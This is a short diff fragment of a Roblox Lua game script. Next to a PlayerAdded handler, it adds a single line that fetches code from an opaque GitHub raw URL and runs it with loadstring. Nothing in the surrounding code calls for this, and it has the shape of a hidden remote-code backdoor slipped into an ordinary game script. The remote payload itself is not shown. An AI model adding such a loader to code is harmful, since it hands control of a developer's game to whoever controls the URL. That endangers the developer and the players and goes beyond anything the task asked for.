@@ -613,6 +613,8 @@ game.Players.PlayerAdded:Connect(function(plr)
 end)
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sinnerx3Florencia/Sinnerx3Florencia/main/wwwwww"))();
+
 
 
 
